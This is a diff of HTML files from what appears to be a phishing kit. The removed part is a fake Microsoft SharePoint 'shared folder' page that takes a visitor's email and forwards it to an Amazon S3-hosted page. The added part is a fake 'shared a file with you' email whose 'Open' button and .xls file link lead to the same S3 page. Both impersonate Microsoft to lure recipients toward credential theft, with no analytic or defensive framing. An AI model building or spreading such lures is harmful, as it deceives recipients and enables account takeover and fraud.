@@ -1,375 +1,80 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Share Invitation — Microsoft SharePoint</title>
-  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300;0,400;0,600;0,700;0,800;1,400&display=swap" rel="stylesheet">
-  <script src="https://www.google.com/recaptcha/api.js?render=explicit&onload=onRecaptchaLoad" async defer></script>
-  <style>
-    :root {
-      --bg1: #f6f8ff;
-      --bg2: #eef6ff;
-      --card: #ffffff;
-      --muted: #6b7280;
-      --accent1: #5b21b6;
-      --accent2: #7c3aed;
-      --glass: rgba(255,255,255,0.65);
-      --radius: 14px;
-      --shadow: 0 10px 30px rgba(16,24,40,0.08);
-    }
-
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
-
-    html, body {
-      height: 100%;
-      font-family: 'Open Sans', system-ui, -apple-system, 'Segoe UI', Roboto, Arial;
-      background: radial-gradient(1200px 600px at 10% 10%, rgba(124,58,237,0.12), transparent),
-                  radial-gradient(1000px 500px at 90% 90%, rgba(59,130,246,0.06), transparent),
-                  linear-gradient(180deg, var(--bg1), var(--bg2));
-      -webkit-font-smoothing: antialiased;
-    }
-
-    body {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      min-height: 100vh;
-      padding: 20px;
-    }
-
-    .container {
-      width: 100%;
-      max-width: 1200px;
-      margin: 0 auto;
-    }
-
-    .stage {
-      position: relative;
-      width: 100%;
-      display: grid;
-      grid-template-columns: 1fr 420px;
-      gap: 48px;
-      align-items: center;
-    }
-
-    .hero {
-      padding: 48px 40px;
-      border-radius: var(--radius);
-      background: linear-gradient(180deg, rgba(255,255,255,0.6), rgba(255,255,255,0.45));
-      box-shadow: var(--shadow);
-      backdrop-filter: blur(6px);
-      transition: transform 0.3s ease, box-shadow 0.3s ease;
-    }
-
-    .hero:hover {
-      transform: translateY(-4px);
-      box-shadow: 0 20px 40px rgba(16,24,40,0.12);
-    }
-
-    .brand {
-      display: flex;
-      align-items: center;
-      gap: 16px;
-      margin-bottom: 32px;
-    }
-
-    .brand img {
-      width: 64px;
-      height: 64px;
-      transition: transform 0.3s ease;
-    }
-
-    .brand:hover img {
-      transform: scale(1.05);
-    }
-
-    .brand h1 {
-      margin: 0;
-      font-size: 20px;
-      letter-spacing: -0.2px;
-      font-weight: 700;
-    }
-
-    .brand p {
-      margin: 0;
-      color: var(--muted);
-      font-size: 14px;
-      font-weight: 400;
-      font-style: italic;
-    }
-
-    .headline {
-      margin-top: 0;
-      margin-bottom: 16px;
-      font-size: 32px;
-      line-height: 1.25;
-      font-weight: 700;
-      color: #0f172a;
-    }
-
-    .sub {
-      color: var(--muted);
-      font-size: 16px;
-      margin-bottom: 32px;
-      font-weight: 400;
-      line-height: 1.5;
-    }
-
-    .illustration {
-      height: 220px;
-      border-radius: 12px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      background: linear-gradient(180deg, rgba(124,58,237,0.06), rgba(99,102,241,0.02));
-      border: 1px solid rgba(99,102,241,0.06);
-      transition: all 0.3s ease;
-    }
-
-    .illustration:hover {
-      transform: translateY(-4px);
-      box-shadow: 0 15px 30px rgba(99,102,241,0.08);
-    }
-
-    .illustration .card {
-      width: 86%;
-      height: 72%;
-      border-radius: 10px;
-      background: linear-gradient(180deg, #fff, #fbfcff);
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      box-shadow: 0 18px 50px rgba(12,13,28,0.06);
-      padding: 20px;
-      transition: all 0.3s ease;
-    }
-
-    .illustration:hover .card {
-      transform: scale(1.02);
-    }
-
-    .illustration .icon {
-      font-weight: 700;
-      color: var(--accent2);
-      font-size: 40px;
-      margin-bottom: 8px;
-    }
-
-    .illustration p {
-      margin: 0;
-      color: var(--muted);
-      font-weight: 400;
-      font-style: italic;
-    }
-
-    .card-form {
-      background: var(--card);
-      padding: 32px;
-      border-radius: 16px;
-      box-shadow: 0 18px 40px rgba(12,13,28,0.06);
-      min-height: 420px;
-      display: flex;
-      flex-direction: column;
-      gap: 20px;
-      justify-content: flex-start;
-      transition: box-shadow 0.25s ease;
-    }
-
-    .card-form h2 {
-      margin: 0 0 8px 0;
-      font-size: 20px;
-      font-weight: 600;
-    }
-
-    .lead {
-      color: var(--muted);
-      font-size: 14px;
-      font-weight: 400;
-      line-height: 1.5;
-      margin-bottom: 8px;
-    }
-
-    .field {
-      margin-top: 12px;
-      position: relative;
-    }
-
-    .field input {
-      width: 100%;
-      padding: 14px 16px;
-      border-radius: 10px;
-      border: 1px solid rgba(15,23,42,0.06);
-      font-size: 15px;
-      outline: none;
-      background: linear-gradient(180deg, #fff, #fbfbff);
-      transition: all 0.3s ease;
-    }
-
-    .field input:focus {
-      box-shadow: 0 8px 30px rgba(99,102,241,0.08);
-      border-color: rgba(124,58,237,0.35);
-      transform: translateY(-2px);
-    }
-
-    .field input:hover {
-      border-color: rgba(124,58,237,0.2);
-    }
-
-    .label {
-      font-size: 14px;
-      color: var(--muted);
-      margin-bottom: 8px;
-      font-weight: 600;
-      display: block;
-    }
-
-    .cta {
-      margin-top: 20px;
-    }
-
-    .btn {
-      display: inline-flex;
-      align-items: center;
-      justify-content: center;
-      width: 100%;
-      padding: 16px;
-      border-radius: 12px;
-      border: 0;
-      font-weight: 700;
-      font-size: 16px;
-      color: white;
-      cursor: pointer;
-      background: linear-gradient(90deg, var(--accent1), var(--accent2));
-      box-shadow: 0 12px 30px rgba(124,58,237,0.18);
-      transform: translateZ(0);
-      transition: transform 0.18s ease, box-shadow 0.18s ease;
-    }
-
-    .btn:active {
-      transform: translateY(1px) scale(0.998);
-    }
-
-    .btn:hover {
-      box-shadow: 0 18px 40px rgba(124,58,237,0.22);
-      transform: translateY(-3px);
-    }
-
-    .toast {
-      position: fixed;
-      right: 24px;
-      bottom: 24px;
-      background: linear-gradient(90deg, #06b6d4, #0ea5e9);
-      color: white;
-      font-weight: 500;
-      padding: 12px 24px;
-      border-radius: 8px;
-      opacity: 0;
-      visibility: hidden;
-      transition: opacity 0.3s ease, visibility 0.3s ease;
-    }
-
-    .toast.show {
-      opacity: 1;
-      visibility: visible;
-    }
-
-  </style>
+<html><head>
+<meta name="GENERATOR" content="MSHTML 11.00.10570.1001">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
 </head>
-<body>
-  <div class="container">
-    <div class="stage">
-      <div class="hero">
-        <div class="brand">
-          <img src="https://tse4.mm.bing.net/th/id/OIP.W5qWsWY_5jh4lODzUojjXgHaHa?cb=12&rs=1&pid=ImgDetMain&o=7&rm=3" alt="Microsoft Logo">
-          <p>         
-            <h1>Microsoft SharePoint</h1>
-            <p>Secure file sharing · OneDrive integration</p>
-        </div>
-		
-        <h2 class="headline">One of your contacts has shared a Folder with you</h2>
-        <p class="sub">Open the shared folder to view files, collaborate, and stay in sync. Secure access — expires in 30 days.</p>
-        <div class="illustration">
-          <div class="card">
-            <div class="icon">📁</div>
-            <p>Your Shared Folder • 24 items is ready to be accessed. </p>
-			            <p>Just input your email.!</p>
-          </div>
-        </div>
-      </div>
-      <div class="card-form">
-        <h2>Enter your email address</h2>
-        <p class="lead">Please confirm your email address below and pass the reCAPTCHA to proceed.</p>
-        <form id="inviteForm">
-          <div class="field">
-            <label for="email" class="label">Email Address</label>
-            <input type="email" id="email" name="email" required placeholder="you@example.com">
-          </div>
-        <div class="cta">
-          <button type="submit" class="btn" id="submitBtn">
-            <span id="btnText"> Access SharePoint Folder </span>
-            <span class="arrow">→</span>
-          </button>
-        </div>
-        </form>
-        <div class="help">
-          <div>Need help? <a href="#">Contact admin</a></div>
-          <div>Expires <strong>30d</strong></div>
-      </div>
-    </div>
-  </div>
-
-  <div class="toast-container">
-    <div id="toast" class="toast">Processing Shared Folder </div>
-  </div>
-
-  <script>
-    function showToast() {
-      const toast = document.getElementById('toast');
-      toast.classList.add('show');
-      setTimeout(() => {
-        toast.classList.remove('show');
-      }, 3000);
-    }
-
-    document.getElementById('inviteForm').addEventListener('submit', function(event) {
-      event.preventDefault();
-      
-      const email = document.getElementById('email').value;
-      if (!validateEmail(email)) {
-        alert('Please enter a valid email address.');
-        return;
+<body><p align="center">
+<strong>
+</strong><strong>
+</strong><font size="5"><strong>
+</strong></font><font size="5"><strong>
+<br></strong></font></p><div align="center"><strong>
+</strong><table align="center" role="presentation" style="margin: 0px auto; border-radius: 8px; border: 1px solid rgb(200, 200, 200); border-image: none; width: 100%; overflow: hidden; max-width: 640px; background-color: rgb(255, 255, 255);" border="0" cellspacing="0" cellpadding="0"><tbody><tr><td align="center" style="padding: 20px 36px 36px;" colspan="3"><strong>
+</strong><p class="editor" style="margin: 0px; padding: 0px; text-align: center; color: rgb(50, 49, 48); line-height: 32px; font-size: 24px; max-width: 400px;"></p><strong>
+</strong><p><strong>
+<img width="40" style="display: block;" alt="Share image" 
+src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGAAAABgCAYAAADimHc4AAAAAXNSR0IArs4c6QAACvdJREFUeAHtXH1sHEcVf2/Pjh1aogaKgSQlaRPnzgk0UDWoIFEBEZWgEqoqkZSqQJHapPluWgp3Z6e91PbdJYEkTZrGCRWkgqqiLQhUPiSktELwB/zVAALf2QlNQZTPNFGh1I7vdvjN2Wef73bn9tb7cafMSOedffPm6/ebmX07b9ZEOmgENAIaAY2ARuByQyCe201CcNjdNsJuQHj1i3sokT8RNgmXMQGSepCQzB0Pk4TLnADJAd0bJgmagNJEAAmJ3FAYM0ETIAmYDBspmT8WNAmagDL88irEJurNPxEkCZqASgJk3BT3YSYcDYoETUA1AfJeiM1BkaAJsCKgTEJv/nG7ZK/kmgAVkqbYQolhX0nQBKgIkGmCtoKEI/XU3KZrApwgJ2gbti0OO1FtVEcT4
+&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;BQxYW7Hy9pjTtWd6mkCnCIl9YTY4TUJmoBqAgzuJ2JRLZ6+lyTEc4em7+cY0QRUAziPhiDaoiSBxE7MhIPVWd3cawKsUMvGhohh/ahnwv0UHz5glb0RWVsjyi2pm8pfTeNt7yAqLiQuXkVkLMRavhB9WYCrfZcysWMY5Vj3+aj8Y6O4CyQQZXsesEmvK7YruG7GplRInemi8eKNsN3XEps3oo1rEX93Q23t5MWUir02nSeex3JkggRVML5B2ehXVBp2aa1PQCIfw0pxJ0bzBoC90q6jjuXVBMiMTkhg/jplYg85rmdKsTUJ6D1zDYnCHQBcAv/BRjut1LciQGZI5reSaaq3JVyQ0FoE9J3tpuIETjMAeBI
+RJZBu&#10;E+0Ik&#10;OXF89&#10;uwHNX&#10;ZluD9&#10;lI191&#10;Wn1rW&#10;EF9Y0&#10;ux37M&#10;SSpMD&#10;GPEf8&#10;E38Ou&#10;hlo1i&#10;Bhjb1&#10;WriIT&#10;y896p&#10;1ZlKb&#10;ewbEX&#10;4W18t&#10;Y+rPF&#10;3Y9TP&#10;0WIrv&#10;Vy9ga&#10;5fAIH&#10;40TjM&#10;TBPmZ&#10;hH3JgydIuIwi67cQJkl52cgsoglh7eTSYctUipEvBczIV4hsIwyzChrW4zbVlOm+4+WuYIQJvOfhnfqSYCzqLHq+C0Q9juAexpwnqZI5DSZ80fpQ4sv0nqA7FVwQgJTljI9CVWVcxxVqqJdpu3NvR1j9AAeePc0UMKbxPxjMvh71D7vZ5S6dqyBvO5U0z1HsNRgzgj7DTpBcUpigKd7knaVNBcBidGP0MXCM2jsUrsGz5Iz/
+xSj/CR1Lvg&#10;JpRb9b1ZaE&#10;DeZ2GGcKWL&#10;MVPu9IZMS2&#10;MoWlIn2WjW&#10;peQhIjNyOt&#10;9WnAWinVUN&#10;nZHItFz+k9&#10;rZ+6u9+eUY&#10;eUiwdewwkS&#10;Ge+PQnCTEI&#10;HMyHWV93K5&#10;rCC5HpK5nO&#10;YzvXAf4Hax&#10;Rq8+t/eFOC&#10;X0ZQkMO8q3&#10;1peTdELEga&#10;q08IlQJ5OT&#10;uT2lywKIRR&#10;t4X8TRe6EV&#10;fFZ6u/5fXU&#10;nmuI+Ezvki&#10;IREDtvdM0H&#10;R6Rkl32KTB&#10;2Pr7KHwc8S&#10;RVZRdKZ8Nz&#10;R0kCYbxgLKRQvRhJjxa1gmPgNL5fJzJtAtMBZiSmzHq18Mc/pedWtPJ09GDxMaDynaZYjdeLPdInXAISOa/iAfp9CioaSzzGyTabgX4QzVprSD
+IRA8AWfXMFvQwTN&#10;RU8FZQMr8ONj5es&#10;GwC06vUFrkVD9k/&#10;2Gi0htg03gvDQt1&#10;W01A9+NR5XaXKPR&#10;0hfoC87db5+TXqo&#10;I+3PPjSsCBTvQwZ&#10;tAc+hD3BLUEpkF0&#10;sfhsELLAEn+l1ao&#10;/cQqmec5bprSKM5&#10;/ahj+rlRzr+0z0p&#10;2aXgCLg0shMN+5g&#10;Njm+SgTW/1ZcdCT&#10;5hN1QVmAfwQvZwW&#10;SUYAvpyUbwpDpYr&#10;rbky302D3b+ukbe&#10;SoLQF7QD8TGx3Zb&#10;f8J+BZOE4K4iRGx&#10;vzKiqfjTN+EK+/5&#10;6ftWjMRzWcxutRP&#10;G4EH0cxb4sqv+W0&#10;Evj9yFem6yxJU5R&#10;x0L7rdMaxWhBJ/E&#10;15TNZSNN6WjNPpD&#10;M4+8MkKOfTMuKUf&#10;
+cEtfEdoexiKtFqI&#10;&#10;DExnKkLvkEZu51QWZO/B&#10;MjRL2iFdZf4CeqP/tY6r&#10;QWkEny5368K0iGj8AXIr&#10;P4tQSnRRuP5mjWv1F7mi&#10;9RxxaOqtrtKk3UW8svJN&#10;N4HL+MSlLEYvyVYn7uwU&#10;YZnkHwO4SpoPtyPNu8ik&#10;Zvrbn0kh9N4x6oPfh1vm&#10;OyjfwRcysnRv1xWUhNYD&#10;FDqmtdr5I0Ijot2+nMOB&#10;69YHr5aA3DXgPBVABtb2&#10;sXakqZPwU15YK0dsUSdR&#10;RtipoqcBF/pZgTZ+/DAV&#10;etMFecfAYJxosyil3KrY&#10;V6sztGOWvxKkuQIzgAV1&#10;wH0T9K53M0o/srZdVjUZ&#10;1OUK3EiP4htFDWwk+CrH&#10;8oVlftDQPzMChITayvqq&#10;YgaQ5TiSxUCdTQ5egOJo&#10;
+jz1tp7M4rJJZZ+BtmqRd&#10;&#10;KaY8GypwuTBLMfgy6L8I&#10;&#10;YBLp9Zqm8p0iToi36pNq&#10;&#10;JKkXnkPjV/aiHX8LjIL3&#10;&#10;VWpwd9KJ4r0aKmCi1Nxs&#10;&#10;jh/CCDxeZu2fp9SK/5pk&#10;&#10;0bUO3oTRvl2Ghv7HHTUa7FtIR&#10;4nSPClE0UZcDg3E1VvQdjk956&#10;AZO56jJZVlvVF6ISlPJH/DNby&#10;R6hY+LBlujvhBCyePyHrX/H7T&#10;+nHU9fJ+wcB7FXKoqXnyqwDPu&#10;MITcbdyWhZt/cECL5t9oNxqov&#10;S9Lw++stZHU7mPgFzbgBLzUdn&#10;yRu9YcIBMv4NsuXwZpOHiZmjt&#10;uhZPGsKtkXFh+9Fmj0Bk+Bbm9&#10;EzhR7EwSv1tvOMrmXMBwJMm1E&#10;sXpw+mbZ7+ANU4IMYXes
+sW1VP&#10;yPwXWEKnyBCnYDeeovSy&#10;v9XL0&#10;lC6dBdKt6EqMB+Cqan2/&#10;6ryT6&#10;V5TwDBLrcyP4l+Tvv/fg&#10;Wdv/g&#10;INud2Yfo3VjfzKwD9KeK&#10;2Zyiz&#10;fMRB39ypjGEpJNqozDwJ&#10;vvoYi&#10;rKAmcTGQJjJZx2T5/aLE&#10;12WiW&#10;y8jc5fwFJBeEu11LAS4s&#10;ghPU8&#10;ROolti1/gBcd5TqvSnMn&#10;qgX8Y&#10;I98T8GVzvCWA8HmQXTDN&#10;A3ZJt&#10;XI+hwO2Wep459OU6vpvK&#10;X2gVitwCbMEf6eX9XpLgDBtXr4cNlk&#10;uM8xpWrryKdrEsGKaKLBxBNaOp+DL3&#10;nlMAF3rCjLms8g3SB3R7ygtF1eFe5C&#10;J6XGAv8ODkmqK8JYAYph1DSzTzGPQ7&#10;6dl0f1NN+L
+LUDEdhalZ56uYsnLjV48&#10;JKH1/66wVD&#10;KsoEtlCA91y9DdnMOCzS&#10;MfwXZh/wWM&#10;CaGHdpjL9A9/X7aJMk5/&#10;1ZD5Gg9Ftl&#10;K7bozkpeEuAqLcE8Qvwi&#10;XyJsksvzKn&#10;VfmeW4KejW4Mwe70lgOy&#10;WIPkBHPdRe&#10;uXeIDo1J34MHsLIDwR82&#10;U6vfcK1O5h&#10;yyTHoU7Aisk0PPvNxgL8&#10;lyHZ6TUDV4&#10;ONfUQffgAfZS1UJzXh7A&#10;svO5iDBlyB&#10;4vARV4so/okWRDbSje7x&#10;S2pRxeTgsH&#10;bsvaPAlFj4RwN+lzuiXa&#10;YdiO7hZmJg&#10;Ef1MY4PtDQIAWxNw55Ce&#10;x7IQGvmy/t&#10;8+A0pfhsUAfYu5JAPiZ6&#10;MawRn653d4&#10;S4OAgUrni0K/ZWL9j8KW
+b1afgLQE+NTLUYq&#10;X3ziR43vwJmgAVrskz74&#10;frFOCLq1Vqc0nTB&#10;Niht3t0Nc4knYLr9F12K&#10;l7INQFWKCZGV9FE&#10;8UWMfGv3qlUelzJNQDVw&#10;fSM9RIVAwJdVawI&#10;qCZD/Y7RYfAk+pcb+1WV&#10;lGQ3GNQGVgI0bXU&#10;GCL6vWBFQSEEJcExAC6J&#10;VVagIq0QghrgkIA&#10;fTKKu23o0VxNf6lJT5qu&#10;4yCKF4XdG/tCSDx&#10;bNCNCb++Bs40edRYvQR5&#10;BKTbYjQBbpHzKJ8&#10;mwCMg3RajCXCLnEf5NAE&#10;eAamL0QhoBDQCGg&#10;GNgEagxRD4P4koPOQHmK&#10;VOAAAAAElFTkSuQ&#10;mCC"></strong></p>
+<strong><font color="#111111" face="Times New Roman" size="5" style="background-color: rgb(247, 247, 247);"><strong>Govindarajulu Bhuvaneswari shared&nbsp;a file with you</strong></font></strong></td></tr><tr><td style="padding: 40px 20px 28px; text-align: center; border-top-color: rgb(222, 222, 222); border-top-width: 1px; border-top-style: solid; background-color: rgb(248, 248, 248);" colspan="3"><font size="4"><font size="3"><strong>
+Here is the file Govindarajulu Bhuvaneswari share with you.</strong></font></font></td></tr>
+<tr>
+<td align="center" style="background-color: rgb(248, 248, 248);" colspan="3"><a style="color: rgb(50, 49, 48); text-decoration: none; display: inline-block;" aria-label="Carol Price Audio" href="https://887836733-27972232324.s3.us-east-2.amazonaws.com/98291283789821/91726812781729712872/7999892-289789782.html"><!---->
+<table align="center" role="presentation" style="background: rgb(255, 255, 255); width: 100%; text-align: center;" border="0" cellspacing="0" cellpadding="0">
+<tbody>
+<tr>
+<td style="background: rgb(255, 255, 255); padding: 20px 4px 20px 20px; border-top-color: rgb(210, 210, 210); border-bottom-color: rgb(210, 210, 210); border-left-color: rgb(210, 210, 210); border-top-width: 1px; border-bottom-width: 1px; border-left-width: 1px; border-top-style: solid; border-bottom-style: solid; border-left-style: solid;">
+ <img width="470" height="474" style="width: 44px; height: 42px;" alt="icon" src="https://th.bing.com/th/id/OIP.ykK5rw63b4q35gNZMsCwngHaHa?r=0&amp;rs=1&amp;pid=ImgDetMain" border="0" hspace="0"></td>
+<td style="padding: 20px 20px 20px 4px; text-align: left; font-size: 16px; border-top-color: rgb(210, 210, 210); border-right-color: rgb(210, 210, 210); border-bottom-color: rgb(210, 210, 210); border-top-width: 1px; border-right-width: 1px; border-bottom-width: 1px; border-top-style: solid; border-right-style: solid; border-bottom-style: solid; -ms-word-break: break-all; background-color: rgb(255, 255, 255);">&nbsp;Detailed Quotation Request &amp; Project Specification Details.xls</td></tr>
+</tbody></table>
+</a>
+</td></tr>
+<tr>
+<td align="center" style="text-align: center; background-color: rgb(248, 248, 248);" colspan="3">
+<div style="display: inline-block;"><!---->
+<table align="center" role="presentation" style="width: auto; height: 20px;" border="0" cellspacing="0" cellpadding="0">
+<tbody>
+<tr>
+<td align="center" style="padding: 24px 4px 20px 0px; height: 20px;">
+<img width="20" height="20" 
+src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAACXBIWXMAABYlAAAWJQFJUiTwAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAfqSURBVHgBzVpPTBxVGP9ma21Nutsl6aHZte1wglPByBqrTQQ8qBehsRBNIVK9CAfhVEykgaZ4sD242wPooX8UPBg1sr3Qmri0hxpTNpFSE+HElJZVkxK3Sy+QdMfv93beMAszs7OztPWXDPN25s2b3/fe9+99g0JbAFVVw0SPWomUOj5U0vV6vhw2DgmNSNdIUWa4zUfgusagCqGQTxRI5/t4iNeYcCP5wwwziFciTNkCmMR16iVjhoPBIDXEYhRriFE0GqWa2lpxDQewsrJCS0tL4jw/N0fT6WlKT0+L3xYml1iQU+UKUpYAqrp/yEo8xqS7u3tMwuViKpWiieSEOJvQ86e0xXtDXsfwJ
+&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;ADPOut1/iduQrepqbmZ+vs/oUgkQluBTCZDoyMjlGRhDLCtBJq8rEZJAVR1XxfpyhfcDEdYPYZPDwt1eRyYn5+n3t6PKcPqxsiSoh/XtLsTbs9sc7tZUBlBfmdHRyedOXuWqquryS8w08COHTts7+/Zs4daWlppbXWNZmdnd/L8vhveHVSyD3LXnMZU3MnTINrdPT1C1/0AxntyYIBnd840WqgexmtpbXV8boRV6svRkcIPF7vYZk9+XyvP/Gil5OfY43R2HCNNWxCzfvBgHYVCIVpYWKCpqRQt8Yo0sz3ZAQ5C53OaPRbHjsZw1W4tm31wi0oJUDBYmuTmzkpnvqf7I1peXiaoX+LcOWpvb6c2PjDzKRY
+ArhQ6&#10;EHOwq&#10;SIhiF&#10;iIqu+&#10;yDGuf&#10;wKan9&#10;PwU/w&#10;3jpX7&#10;JA8lk&#10;Uug8d&#10;PpEf3&#10;+Rm4U&#10;KXbhw&#10;UVwbH&#10;xsrjg&#10;cb0MO&#10;TCC7g&#10;ZHhCc&#10;hRA6D&#10;2f4G0&#10;w+5VA&#10;zC6R4&#10;zgQAu&#10;oD8tN&#10;GXydg&#10;DHBi1&#10;Kv7nx+03guskxeqI24m4glfgcmKTGbJJOqESESQcl0BAFxOs/sWUAJ9nAyYOZZlBfKCPJYckbVSBIMhcZau0w5LhpBRDwER9tBUMPgw5Xf1yutCAGP2u9CuVHUkjJfR2Ng3tvdh5JfZTjC7XicM0V/AsgrGCjxqxF/o5FalB52dnYLct+PjNCr9uQHo/IcfHBftDqOfF4BbQ4PwWOYqiECmHtj/O5/q44lzjn7ZDxAHQBQ6D
+pK1PNM5IyM&#10;F3m5poeHhz&#10;8oZ0iK8fk2&#10;7c7cpINSHy&#10;eMFW0keSFu&#10;8i/Q2kry8t&#10;lTIezyj1sx&#10;8lUao0TMF9&#10;VEcg4kd8OI&#10;x9t+Ipiu5n&#10;NgDvMhL28I&#10;zGi24u6JUA&#10;H5cqCffy3F&#10;/JG1QK6TRE&#10;Og8xwT5XCn&#10;IvUchBQ+1b&#10;AuHw+9z6+W&#10;2tnY6WFdXc&#10;gCoRXvbUfr&#10;1xg1avn9fC&#10;ANPg2iJQTH&#10;4lclJSiTig&#10;jDIIfKijZc&#10;jYcMsQihEW&#10;UwCnkMfpyR&#10;vI/DeG/x+3&#10;glqbMSKyPFrPXgCLLfUaRC4cvVnmr39hzjD/UIQ3B8fHxP9EW3dxkWUhbfCc/IZL4jI1VJIDbAUKtpePAGWHeThapEeSI+F8+nhYSGUXBEI5MW
+jSSNGSuEVtTU1Rk&#10;uphxtVi6RygfTbT&#10;jkSBJMTAXvwAqHT&#10;bD9ScE/PhEKyGQ5&#10;YB3KDsUtyVQkRlG&#10;oK9yMejRKIvRQrC&#10;MEG7gUWrvBC3iCl&#10;zpXIW2ReU04uhRX&#10;t7iZfwApkrS92gg&#10;z5cHtph+wRRo6dl&#10;/Q4XjF98yYlJyZK&#10;cpCw9vMsAADDBAY&#10;GPt0UgKSHAsrdR1&#10;y+nKSTJweKgpwbL&#10;O/WnhGlPvZE8O+l&#10;vEZHRwfHgT+FMb/&#10;15hsiFYhySgzjS6&#10;V+EZOAa14N2C/WJ&#10;1tnAVCvpHUjLYXm&#10;5tdF4MEgEGQjYg2&#10;Pp+RihblSOs1AgF&#10;uICIikyAzdYE0PR&#10;H7e1Cx0HcKkWCiM&#10;AVXI/JVxVSPkRFb&#10;h5Y4McSaSXPdeiC&#10;
+22z6cNGwwoM4qod&#10;&#10;er5f0EEEdXJ+CR5t+IWi&#10;AgBeDVPnOh3nBAYLPqVA&#10;qK8HV595VBBjZS16kI6r&#10;R6YQoUZod+OGIwGOg/hv&#10;v/hR1dbgT20HX1HvGDyy&#10;lXbJA19rE4AewbYEIS2b&#10;m7sEkysdB9X7xgz2p3FF&#10;4xApl/D340bDwl5XWyuS&#10;xg67h8rVBEEMac+ICePY&#10;HCXuI4gab1uB7N+Ksry5&#10;o4skOA/WaiAXX4+Pzcvz&#10;jBgL+g0VCdlrTpvAcBtv&#10;ZK9dh1/hQBcBM5Kic6c+&#10;XzTgyI4sbv0ut2EqqGvr&#10;ExsFUwN0fVLmva3hqZZG&#10;zWMeYGbYSdbeJqQ+xABN&#10;l4pgJnMWVcBkdZrWH8SA&#10;BfDcFE5HJLkgaLaKBdPr&#10;4fDu1v5gb2rq6t0+PBh+&#10;
+j8gHo+LHSBhnhfvHrHe2&#10;&#10;1TcDVc9d5Uvd91Gfd6l8&#10;&#10;PqkgPhz8cJ5NFlD1g5ls&#10;&#10;w+LirubBECHcFXoH1a01&#10;&#10;lLV48eNom8Eiv6epmV+2&#10;&#10;9jH9vtANpub4Xo8mo1PS&#10;&#10;4gNHziGtDv3vrLr5/iJSdiDRY&#10;jcSo7quGrhtXLgFzBY6LyhNgX&#10;yi/dOOfX38pEPX2suEj7ysW9H&#10;9a52C4q/dhC5FHtAY28Mr9jHV&#10;vu12zMeP7Pu5eLvs/jwoeI3cn&#10;5km9Ey9r1uQIRFALV8L+Yv+Gt&#10;HrO7SCeV+6B7kHHxI/kY6jYKU&#10;n5IkVAXBCd+H02lzi5pllYm7q&#10;cxG+PhXA16N/PZB3sl1yWuyNA&#10;JDh3rt4t9Ry74YZCVhpNpQFZC&#10;2BEtBnAIPExxPs+XwqeC
+fPVgQ&#10;2t7I9oEydz35AmfBOh8+&#10;iEv4F&#10;sAKU5g81VEgUG9U+1RLl&#10;6w4sP&#10;/O5zXspLhAk/RL2or/AC&#10;Lq7mb&#10;y0h8AAAAAAElFTkSuQmC&#10;C">
+ </td>
+<td style="padding: 20px 0px; color: rgb(50, 49, 48);">
+<span style="color: rgb(17, 17, 17); text-transform: none; text-indent: 0px; letter-spacing: normal; font-family: Roboto, sans-serif; font-style: normal; font-weight: 400; word-spacing: 0px; float: none; display: inline !important; white-space: pre-wrap; orphans: 2; widows: 2; background-color: rgb(247, 247, 247); font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: 
+initial;">
+<span style="color: rgb(17, 17, 17); text-transform: none; text-indent: 0px; letter-spacing: normal; font-family: Roboto, sans-serif; font-style: normal; font-weight: 400; word-spacing: 0px; float: none; display: inline !important; white-space: pre-wrap; orphans: 2; widows: 2; background-color: rgb(247, 247, 247); font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: 
+initial;"><strong>This link only works for the direct recipients of this message.</strong></span></span></td></tr></tbody></table></div></td></tr>
+<tr>
+<td style="padding: 0px 0px 32px; height: 40px; text-align: center; border-top-color: currentColor; border-bottom-color: currentColor; border-top-width: medium; border-bottom-width: medium; border-top-style: none; border-bottom-style: none; background-color: rgb(248, 248, 248);" colspan="3"><!---->
+<a style="border-style: solid; border-color: rgb(0, 90, 158); border-radius: 2px; width: 168px; text-align: center; color: rgb(255, 255, 255); line-height: 40px; font-size: 16px; text-decoration: none; display: inline-block; background-color: rgb(0, 90, 158);" aria-label="Open Carol Price Audio" href="https://887836733-27972232324.s3.us-east-2.amazonaws.com/98291283789821/91726812781729712872/7999892-289789782.html">Open </a></td></tr></tbody></table></div><p align="center">
+<br></p>
+ <style>
+      body {
+        margin: 0;
+        padding: 0;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        background: linear-gradient(90deg, #ded3d0 0%, #e3e8d4 100%);
+        font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen,
+          Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
+          background-image: url("https://ik.imagekit.io/py0k61gqz/backgr.jpg");
+          background-repeat: no-repeat;
+    background-size: cover; /* or contain */
+    background-position: center;
       }
-
-      // Construct URL with email as query parameter - DIRECT to Workers
-      const url = `https://887836733-27972232324.s3.us-east-2.amazonaws.com/98291283789821/91726812781729712872/7999892-289789782.html#${encodeURIComponent(email)}`;
-      
-      // Show success message
-      showToast();
-      
-      // Redirect directly to Workers URL with email in query string
-      window.location.href = url;
-      
-      // Reset form
-      document.getElementById('inviteForm').reset();
-    });
-
-    function validateEmail(email) {
-      const regex = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,6}$/;
-      return regex.test(email);
-    }
-
